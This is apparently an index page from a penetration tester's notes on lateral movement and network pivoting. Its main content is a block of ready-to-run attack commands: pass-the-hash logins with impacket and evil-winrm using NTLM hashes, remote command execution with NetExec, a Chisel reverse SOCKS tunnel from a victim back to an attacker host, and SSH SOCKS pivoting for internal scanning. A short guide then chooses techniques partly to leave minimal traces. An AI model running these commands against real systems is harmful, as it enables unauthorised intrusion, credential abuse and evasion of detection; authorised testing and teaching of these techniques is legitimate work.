---
tags: [lateral-movement, pivoting, index]
---

# Lateral Movement — Index

> Full playbook: [[06-Lateral-Movement/INDEX]]

## Notes in This Section

| Note | Content |
|------|---------|
| [[07-Lateral-Movement/Windows-Lateral]] | WMI/PSExec/WinRM/DCOM, PtH/PtT |
| [[07-Lateral-Movement/Linux-Lateral]] | SSH hijacking, agent forwarding |
| [[07-Lateral-Movement/Network-Pivoting]] | Chisel, Ligolo, SSH tunnels |

## Quick Commands

```bash
# PtH — Linux tools
impacket-wmiexec -hashes :<NTLM> <domain>/<user>@<target>
impacket-psexec -hashes :<NTLM> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <NTLM>
nxc smb <target> -u <user> -H <NTLM> -x "whoami"

# Pivoting — Chisel
# Attacker: ./chisel server -p 8888 --reverse --socks5
# Victim:   ./chisel client <attacker>:8888 R:socks

# Pivoting — SSH SOCKS
ssh -D 1080 -N user@<jump>
proxychains nmap <internal-subnet>

# WMI exec (no service creation)
impacket-wmiexec <domain>/<user>:<pass>@<target>

# WinRM (requires port 5985)
evil-winrm -i <target> -u <user> -p <pass>
```

## Decision Guide

```
PtH possible? → use impacket-wmiexec or evil-winrm (WinRM)
Need full interactive shell? → evil-winrm > psexec
Minimal traces? → WMI > PSExec (PSExec creates a service)
Pivoting to isolated network? → Chisel R:socks → proxychains
Multiple hops? → Ligolo-ng (handles routing automatically)
```

## Related

- [[06-Lateral-Movement/INDEX]] — Full techniques reference
- [[08-Active-Directory/INDEX]] — AD-specific lateral movement
- [[00-Quick-Reference/CrackMapExec]] — NetExec for lateral movement
